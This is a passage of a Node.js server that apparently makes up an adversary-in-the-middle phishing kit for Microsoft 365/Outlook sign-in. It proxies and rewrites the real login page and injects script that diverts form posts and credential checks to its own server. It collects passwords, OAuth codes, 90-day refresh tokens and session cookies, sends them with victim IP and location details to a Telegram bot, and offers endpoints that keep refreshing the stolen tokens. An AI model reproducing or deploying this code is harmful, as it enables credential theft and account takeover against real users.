        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 5,
      timeout: 30000
    });

    let html = microsoftResponse.data;
    const $ = cheerio.load(html);
    
    const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
    
    $('head').append(`
      <script>
        (function() {
          console.log('🔧 Desktop flow proxy active');
          
          const ORIGIN = '${origin}';
          
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
              console.log('🔄 Redirecting GetCredentialType to proxy');
              return originalFetch(ORIGIN + '/proxy/GetCredentialType', {
                ...options,
                headers: {
                  ...options.headers,
                  'Origin': ORIGIN
                }
              });
            }
            return originalFetch(url, options);
          };
          
          const originalXHR = window.XMLHttpRequest;
          window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            
            xhr.open = function(method, url, ...args) {
              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                console.log('🔄 Redirecting XHR GetCredentialType to proxy');
                url = ORIGIN + '/proxy/GetCredentialType';
              }
              return originalOpen.call(this, method, url, ...args);
            };
            
            return xhr;
          };
          
          document.addEventListener('submit', function(e) {
            const form = e.target;
            if (form.action.includes('/common/login')) {
              e.preventDefault();
              console.log('🔄 Intercepted form submission to /common/login');
              form.action = ORIGIN + '/proxy/desktop-login';
              form.submit();
            }
          }, true);
        })();
      </script>
    `);
    
    const params = {};
    $('input').each((i, elem) => {
      const name = $(elem).attr('name');
      const value = $(elem).attr('value') || '';
      if (name && value) params[name] = value;
    });
    
    microsoftParams.set(sessionId, params);
    
    $('form').each((i, form) => {
      console.log('🔧 Original form action:', $(form).attr('action'));
      
      $(form).attr('action', '/proxy/desktop-login');
      $(form).attr('method', 'POST');
      $(form).removeAttr('onsubmit');
      
      $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
      $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
      $(form).append(`<input type="hidden" name="client_id" value="${DESKTOP_CLIENT_ID}">`);
      $(form).append(`<input type="hidden" name="redirect_uri" value="${DESKTOP_REDIRECT_URI}">`);
      $(form).append(`<input type="hidden" name="scope" value="https://outlook.office.com/.default openid profile offline_access">`);
      $(form).append(`<input type="hidden" name="response_mode" value="query">`);
      $(form).append(`<input type="hidden" name="code_challenge" value="${codeChallenge}">`);
      $(form).append(`<input type="hidden" name="code_challenge_method" value="S256">`);
      
      $(form).on('submit', function(e) {
        console.log('📤 Form submitting to:', $(this).attr('action'));
        return true;
      });
      
      console.log('✅ Modified form action to:', $(form).attr('action'));
    });
    
    res.send($.html());
    
  } catch (error) {
    console.error('Desktop flow error:', error.message);
    res.status(500).send('Error loading login page');
  }
});

// ============= PROXY HANDLERS =============

app.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
  console.log('📥 Proxying GetCredentialType request');
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  try {
    const response = await axios.post(
      'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US',
      req.body,
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Origin': 'https://login.microsoftonline.com',
          'Referer': 'https://login.microsoftonline.com/'
        }
      }
    );
    
    res.json(response.data);
  } catch (error) {
    console.log('GetCredentialType error:', error.message);
    res.json({
      Exists: true,
      ThrottleStatus: 0,
      Credential: { IsSignupDisallowed: false }
    });
  }
});

app.options('/proxy/GetCredentialType', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= COMMON LOGIN ENDPOINT =============
app.post('/common/login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 POST to /common/login received');
  
  const victimInfo = await getVictimInfo(req);
  
  let sessionId = req.body?.state || req.body?.sessionId || 'unknown';
  const username = req.body?.login || req.body?.username;
  const password = req.body?.passwd || req.body?.password;
  
  console.log(`📌 Initial Session ID from form: ${sessionId}`);
  console.log(`📌 Request body keys:`, Object.keys(req.body));
  
  if (username && password) {
    console.log(`🔑 Credentials captured from /common/login: ${username} for session ${sessionId}`);
    
    let session = capturedData.get(sessionId);
    if (!session) {
      session = { credentials: {}, cookies: [], tokens: {} };
    }
    
    session.credentials = { 
      username, 
      password, 
      time: new Date().toISOString(),
      victimInfo 
    };
    
    capturedData.set(sessionId, session);
    
    if (bot && telegramGroupId) {
      const message =       
        `🔑 *---(Post-Auth) Captured---*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${username}\`\n` +
        `*Password:* \`${password}\`\n` +
        `*Session ID:* \`${sessionId}\`\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Victim Information:*\n` +
        `*IP:* \`${victimInfo.ip}\`\n` +
        `*Location:* ${victimInfo.location}\n` +
        `*Browser:* ${victimInfo.browser}\n` +
        `*OS:* ${victimInfo.os}\n` +
        `*Time:* ${victimInfo.timestamp}`;
      
      bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
        .catch(() => {});
    }
  }
  
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': 'https://login.microsoftonline.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      const stateMatch = location.match(/[?&]state=([^&]+)/) || location.match(/#.*[?&]state=([^&]+)/);
      if (stateMatch && stateMatch[1]) {
        const extractedState = stateMatch[1];
        console.log(`📌 Extracted state from redirect: ${extractedState}`);
        
        if (extractedState !== 'unknown') {
          sessionId = extractedState;
          console.log(`📌 Updated session ID to: ${sessionId}`);
        }
      }
      
      if (location.includes('nativeclient') && location.includes('code=')) {
        console.log('🎯 Detected nativeclient redirect with code');
        
        const codeMatch = location.match(/[?&]code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const code = decodeURIComponent(codeMatch[1]);
          console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
          
          const codeVerifier = codeVerifiers.get(sessionId);
          
          if (codeVerifier) {
            console.log(`✅ Found code verifier for session ${sessionId}`);
            
            if (sessionId.startsWith('dual_')) {
              console.log('🔄 Starting WINNING STRATEGY dual token capture...');
              
              let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
              
              console.log('🔄 Step 1: Exchanging code for Outlook token...');
              const outlookTokens = await exchangeForResource(
                sessionId, code, codeVerifier, 
                'https://outlook.office.com/.default', 
                'outlook'
              );
              
              if (outlookTokens) {
                tokenSession.tokens.outlook = {
                  access_token: outlookTokens.access_token,
                  refresh_token: outlookTokens.refresh_token,
                  expires_in: outlookTokens.expires_in,
                  scope: outlookTokens.scope,
                  captured_at: new Date().toISOString()
                };
                console.log('✅ Outlook token captured!');
                
                console.log('🔄 Step 2: Using Outlook refresh token to obtain Graph token...');
                
                try {
                  const graphResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                    new URLSearchParams({
                      client_id: DUAL_TOKEN_CLIENT_ID,
                      refresh_token: outlookTokens.refresh_token,
                      grant_type: 'refresh_token',
                      scope: 'https://graph.microsoft.com/.default'
                    }).toString(),
                    {
                      headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json'
                      }
                    }
                  );
                  
                  const graphTokens = graphResponse.data;
                  console.log('✅ Graph token obtained via refresh!');
                  
                  tokenSession.tokens.graph = {
                    access_token: graphTokens.access_token,
                    refresh_token: graphTokens.refresh_token || outlookTokens.refresh_token,
                    expires_in: graphTokens.expires_in,
                    scope: graphTokens.scope,
                    captured_at: new Date().toISOString()
                  };
                  
                } catch (graphError) {
                  console.error('❌ Graph token via refresh failed:', graphError.response?.data || graphError.message);
                }
              }
              
              tokenSession.tokens.dual_capture = true;
              tokenSession.tokens.captured_at = new Date().toISOString();
              capturedData.set(sessionId, tokenSession);
              
              await sendDualTokenNotification(sessionId, username, victimInfo, 
                tokenSession.tokens.outlook, 
                tokenSession.tokens.graph);
              
              console.log('🔄 Redirecting user to Outlook from /common/login');
              return res.redirect('https://outlook.live.com/mail/');
            } else {
              const tokens = await exchangeDesktopCodeForTokens(sessionId, code, codeVerifier);
              if (tokens) {
                await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
                console.log('🔄 Redirecting user to Outlook from /common/login');
                return res.redirect('https://outlook.live.com/mail/');
              }
            }
          } else {
            console.log(`❌ No code verifier found for session ${sessionId}`);
          }
        }
      }
      
      if (location.includes('/common/login')) {
        const errorMatch = location.match(/error=([^&]+)/);
        const error = errorMatch ? errorMatch[1] : 'invalid_password';
        return res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username || '')}&state=${sessionId}`);
      }
      
      return res.redirect(location);
    }
    
    res.send(response?.data || 'OK');
    
  } catch (error) {
    console.error('❌ Error forwarding to /common/login:', error.message);
    res.redirect('/microsoft?error=connection_error');
  }
});

// Desktop token exchange function
async function exchangeDesktopCodeForTokens(sessionId, code, codeVerifier) {
  console.log(`🔄 Exchanging desktop code for 90-day tokens (Session: ${sessionId})...`);
  
  try {
    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: DESKTOP_CLIENT_ID,
        code: code,
        code_verifier: codeVerifier,
        redirect_uri: 'urn:ietf:wg:oauth:2.0:oob',
        grant_type: 'authorization_code',
        scope: 'https://outlook.office.com/.default offline_access'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
          'X-Client-SKU': 'MSAL.Desktop',
          'X-Client-Ver': '4.48.1.0',
          'Accept': 'application/json'
        }
      }
    );
    
    return tokenResponse.data;
    
  } catch (error) {
    console.error(`❌ Desktop token exchange failed:`, error.response?.data || error.message);
    return null;
  }
}

// ============= DESKTOP TOKEN NOTIFICATION =============
async function sendDesktopTokenNotification(sessionId, username, victimInfo, tokens) {
  try {
    const fileContent = `🔐 90-DAY DESKTOP TOKENS CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session ID: ${sessionId}
Email: ${username}
Capture Time: ${new Date().toISOString()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ACCESS TOKEN (Valid for ${tokens.expires_in} seconds)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.access_token}

REFRESH TOKEN (Valid for 90 DAYS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.refresh_token}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Victim Information:
IP: ${victimInfo.ip}
Location: ${victimInfo.location}
Browser: ${victimInfo.browser}
OS: ${victimInfo.os}
Time: ${victimInfo.timestamp}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    await bot.sendDocument(
      telegramGroupId,
      Buffer.from(fileContent, 'utf-8'),
      {},
      {
        filename: `desktop_tokens_${sessionId}_${Date.now()}.txt`,
        contentType: 'text/plain'
      }
    );
    
    const summaryMessage = 
      `🎯 *90-DAY DESKTOP TOKENS CAPTURED!*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Email:* \`${username}\`\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Token file attached below!*\n` +
      `*Debug:* \`/debug-cookies/${sessionId}\``;
    
    await bot.sendMessage(telegramGroupId, summaryMessage, { parse_mode: 'Markdown' });
    
  } catch (error) {
    console.error('❌ Failed to send token file:', error.message);
  }
}

// ============= SERVE OUTLOOK PAGE =============
async function serveOutlookPage(res, sessionId, username, victimInfo) {
  console.log('🔄 Serving Outlook page directly...');
  
  try {
    const outlookSession = capturedData.get(sessionId) || {};
    const cookieHeader = outlookSession.cookies ? outlookSession.cookies.join('; ') : '';
    
    const outlookResponse = await axios.get('https://outlook.live.com/mail/', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': cookieHeader,
        'Authorization': outlookSession.tokens?.access_token ? `Bearer ${outlookSession.tokens.access_token}` : ''
      },
      maxRedirects: 5,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    let outlookHtml = outlookResponse?.data || '';
    const outlookCookies = outlookResponse?.headers['set-cookie'] || [];
    
    if (outlookCookies.length > 0) {
      console.log(`🍪 Captured ${outlookCookies.length} additional Outlook cookies`);
      
      let outlookDataSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
      if (!outlookDataSession.cookies) outlookDataSession.cookies = [];
      outlookCookies.forEach(cookie => {
        if (!outlookDataSession.cookies.includes(cookie)) outlookDataSession.cookies.push(cookie);
      });
      capturedData.set(sessionId, outlookDataSession);
    }
    
    await sendCookieNotification(sessionId, username, victimInfo);
    
    if (outlookHtml) {
      const injectionSession = capturedData.get(sessionId) || {};
      const tokens = injectionSession.tokens || {};
      
      const injectionScript = `
        <script>
          (function() {
            console.log('🔍 Outlook page loaded via proxy - session: ${sessionId}');
            
            const capturedData = {
              sessionId: '${sessionId}',
              hasTokens: ${tokens.access_token ? 'true' : 'false'},
              timestamp: new Date().toISOString()
            };
            
            localStorage.setItem('phish_captured_' + '${sessionId}', JSON.stringify(capturedData));
            
            fetch('/api/login-confirmed', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                sessionId: '${sessionId}',
                hasTokens: ${tokens.access_token ? 'true' : 'false'},
                url: window.location.href
              })
            }).catch(() => {});
          })();
        </script>
      `;
      
      if (outlookHtml.includes('</body>')) {
        outlookHtml = outlookHtml.replace('</body>', injectionScript + '</body>');
      } else {
        outlookHtml = outlookHtml + injectionScript;
      }
      
      const finalSession = capturedData.get(sessionId) || {};
      if (finalSession.cookies && finalSession.cookies.length > 0) {
        res.setHeader('Set-Cookie', finalSession.cookies);
      }
      
      console.log(`✅ Serving modified Outlook page for session ${sessionId}`);
      return res.send(outlookHtml);
    }
    
    res.redirect('https://outlook.live.com/mail/');
    
  } catch (error) {
    console.error('❌ Error serving Outlook page:', error.message);
    res.redirect('https://outlook.live.com/mail/');
  }
}

app.get('/common/login', (req, res) => {
  console.log('🔄 GET to /common/login - processing OAuth callback');
  
  if (req.url.includes('#code=')) {
    const sessionId = req.query.state || 'unknown';
    const codeMatch = req.url.match(/#code=([^&]+)/);
    
    if (codeMatch && codeMatch[1]) {
      const code = codeMatch[1];
      console.log(`✅ OAuth callback with code for session ${sessionId}`);
      return res.redirect('/microsoft?processing=true');
    }
  }
  
  const error = req.query.error || 'invalid_password';
  const username = req.query.username || '';
  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
});

app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Desktop login submission');
  
  const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
  const username = req.body?.login;
  const password = req.body?.passwd;
  
  const victimInfo = await getVictimInfo(req);
  
  if (username && password) {
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
    capturedData.set(sessionId, session);
  }
  
  const codeVerifier = codeVerifiers.get(sessionId);
  
  if (!codeVerifier) {
    console.error(`❌ No code verifier for session ${sessionId}`);
    return res.redirect('/microsoft-desktop?error=no_verifier');
  }
  
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    console.log('📤 Submitting desktop login form...');
    
    const axiosInstance = axios.create({
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    });
    
    const response = await axiosInstance.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
        'X-Client-SKU': 'MSAL.Desktop',
        'X-Client-Ver': '4.48.1.0'
      }
    }).catch(err => err.response);
    
    if (response?.status >= 300 && response?.status < 400 && response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
        const codeMatch = location.match(/[?&]code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const code = decodeURIComponent(codeMatch[1]);
          console.log(`✅ Desktop auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
          
          const tokenParams = {
            client_id: DESKTOP_CLIENT_ID,
            code: code,
            code_verifier: codeVerifier,
            redirect_uri: 'urn:ietf:wg:oauth:2.0:oob',
            grant_type: 'authorization_code',
            scope: 'https://outlook.office.com/.default offline_access'
          };
          
          const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams(tokenParams).toString(),
            {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
                'X-Client-SKU': 'MSAL.Desktop',
                'X-Client-Ver': '4.48.1.0',
                'Accept': 'application/json'
              }
            }
          );
          
          const tokens = tokenResponse.data;
          
          if (tokens.access_token && tokens.refresh_token) {
            console.log('✅ 90-DAY TOKENS CAPTURED!');
            
            let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
            tokenSession.tokens = {
              access_token: tokens.access_token,
              refresh_token: tokens.refresh_token,
              id_token: tokens.id_token,
              expires_in: tokens.expires_in,
              token_type: tokens.token_type,
              scope: tokens.scope,
              captured_at: new Date().toISOString(),
              is_desktop: true
            };
            capturedData.set(sessionId, tokenSession);
            
            await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
            
            console.log('🔄 Redirecting user to Outlook...');
            return res.redirect('https://outlook.live.com/mail/');
          }
        }
      }
      
      if (!location.includes('urn:ietf:wg:oauth:2.0:oob')) {
        return res.redirect(location);
      }
    }
    
    res.redirect('/microsoft-desktop?error=auth_failed');
    
  } catch (error) {
    console.error('❌ Desktop login error:', error.message);
    if (error.response) {
      console.error('Response data:', error.response.data);
    }
    res.redirect('/microsoft-desktop?error=connection_error');
  }
});

// ============= DESKTOP TOKEN VERIFICATION =============
app.get('/verify-desktop/:sessionId', async (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens) {
    return res.json({ error: 'Session or tokens not found' });
  }
  
  try {
    const token = session.tokens.access_token || session.tokens.outlook?.access_token;
    const response = await axios.get('https://outlook.office.com/api/v2.0/me', {
      headers: {
        'Authorization': `Bearer ${token}`,
        'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
      }
    });
    
    res.json({
      success: true,
      message: 'Token is valid!',
      user: response.data,
      token_type: session.tokens.dual_capture ? 'Dual token session' : (session.tokens.is_desktop ? 'Desktop token' : 'Web token'),
      has_outlook: !!session.tokens.outlook,
      has_graph: !!session.tokens.graph
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.response?.data || error.message
    });
  }
});

// ============= PROXY ENDPOINT =============
app.options('/api/outlook-proxy', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

app.post('/api/outlook-proxy', express.json(), async (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  console.log(`📥 Proxy request: ${req.method}`);
  
  const { outlookPath, method, data, queryParams } = req.body;
  
  if (!outlookPath) {
    return res.status(400).json({ error: 'No outlookPath specified' });
  }
  
  const targetUrl = outlookPath;
  console.log(`🔄 Forwarding ${method || 'GET'} to: ${targetUrl}`);
  
  try {
    const forwardHeaders = {
      'Authorization': req.headers.authorization,
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
    };
    
    Object.keys(forwardHeaders).forEach(key => 
      forwardHeaders[key] === undefined && delete forwardHeaders[key]
    );
    
    const response = await axios({
      method: method || 'GET',
      url: targetUrl,
      data: data,
      headers: forwardHeaders,
      params: queryParams,
      timeout: 30000
    });
    
    console.log(`✅ Proxy success: ${response.status}`);
    
    if (response.headers['content-type']) {
      res.setHeader('Content-Type', response.headers['content-type']);
    }
    
    res.status(response.status).json(response.data);
    
  } catch (error) {
    console.error('❌ Proxy error:', error.message);
    
    if (error.response) {
      res.status(error.response.status).json({
        error: 'API error',
        status: error.response.status,
        details: error.response.data
      });
    } else if (error.request) {
      res.status(504).json({ 
        error: 'Gateway Timeout', 
        message: 'No response from API' 
      });
    } else {
      res.status(500).json({ 
        error: 'Proxy failed', 
        message: error.message 
      });
    }
  }
});

// ============= COOKIE NOTIFICATION =============
async function sendCookieNotification(sessionId, username, victimInfo) {
  const notifySession = capturedData.get(sessionId);
  if (!notifySession) return;
  
  const criticalPatterns = ['FedAuth', 'x-ms-gateway-token', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'MSISAuth', 'SignInStateCookie'];
  const capturedCritical = (notifySession.cookies || []).filter(c => criticalPatterns.some(p => c.includes(p)));
  
  const cookieSummary = capturedCritical.map(c => {
    const match = c.match(/([^=]+)=([^;]+)/);
    return match ? `• ${match[1]}=${match[2].substring(0, 30)}...` : `• ${c.substring(0, 50)}...`;
  }).join('\n');
  
  let tokenSummary = '';
  if (notifySession.tokens) {
    if (notifySession.tokens.outlook) {
      tokenSummary += `• Outlook Token: ${notifySession.tokens.outlook.access_token?.substring(0, 30)}...\n`;
    }
    if (notifySession.tokens.graph) {
      tokenSummary += `• Graph Token: ${notifySession.tokens.graph.access_token?.substring(0, 30)}...\n`;
    }
    if (notifySession.tokens.access_token && !notifySession.tokens.dual_capture) {
      tokenSummary += `• Access Token: ${notifySession.tokens.access_token?.substring(0, 30)}...\n`;
      tokenSummary += `• Refresh Token: ${notifySession.tokens.refresh_token?.substring(0, 30)}...\n`;
    }
    tokenSummary += `• Expires In: ${notifySession.tokens.expires_in || notifySession.tokens.outlook?.expires_in || 'Unknown'} seconds`;
  } else {
    tokenSummary = 'No tokens';
  }
  
  if ((capturedCritical.length > 0 || notifySession.tokens) && bot && telegramGroupId) {
    const message = 
      `🎯 *COMPLETE SESSION CAPTURED!*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Email:* \`${username}\`\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*🍪 CRITICAL COOKIES (${capturedCritical.length}):*\n${cookieSummary || 'None'}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*🔑 TOKENS:*\n${tokenSummary}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Victim Information:*\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Browser:* ${victimInfo.browser}\n` +
      `*OS:* ${victimInfo.os}\n` +
      `*Time:* ${victimInfo.timestamp}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Debug:* \`/debug-cookies/${sessionId}\``;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(e => console.error('Telegram error:', e.message));
  }
}

// ============= TOKEN REFRESH ENDPOINTS =============

// Generic token refresh endpoint (for Outlook tokens)
app.post('/api/refresh-token', express.json(), async (req, res) => {
  console.log('📥 Token refresh request received');
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const { refreshToken, clientId } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ error: 'No refresh token provided' });
  }
  
  try {
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://outlook.office.com/.default offline_access'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    
    console.log('✅ Token refreshed successfully');
    res.json(response.data);
    
  } catch (error) {
    console.error('❌ Token refresh failed:', error.response?.data || error.message);
    res.status(error.response?.status || 500).json({ 
      error: 'Token refresh failed',
      details: error.response?.data || error.message 
    });
  }
});

app.options('/api/refresh-token', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= GRAPH TOKEN REFRESH ENDPOINT =============
app.post('/api/refresh-graph', express.json(), async (req, res) => {
  console.log('📥 Graph token refresh request received');
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const { refreshToken, clientId } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ error: 'No refresh token provided' });
  }
  
  try {
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: clientId || '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://graph.microsoft.com/.default offline_access'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    
    console.log('✅ Graph token refreshed successfully');
    res.json(response.data);
    
  } catch (error) {
    console.error('❌ Graph token refresh failed:', error.response?.data || error.message);
    res.status(error.response?.status || 500).json({ 
      error: 'Graph token refresh failed',
      details: error.response?.data || error.message 
    });
  }
});

app.options('/api/refresh-graph', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= SESSION-SPECIFIC REFRESH ENDPOINTS =============
app.post('/api/refresh-token/:sessionId', express.json(), async (req, res) => {
  console.log(`📥 Session-specific token refresh for ${req.params.sessionId}`);
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens) {
    return res.status(404).json({ error: 'Session or tokens not found' });
  }
  
  const refreshToken = session.tokens.refresh_token || session.tokens.outlook?.refresh_token;
  
  if (!refreshToken) {
    return res.status(404).json({ error: 'No refresh token found in session' });
  }
  
  try {
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://outlook.office.com/.default offline_access'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    
    const newTokens = response.data;
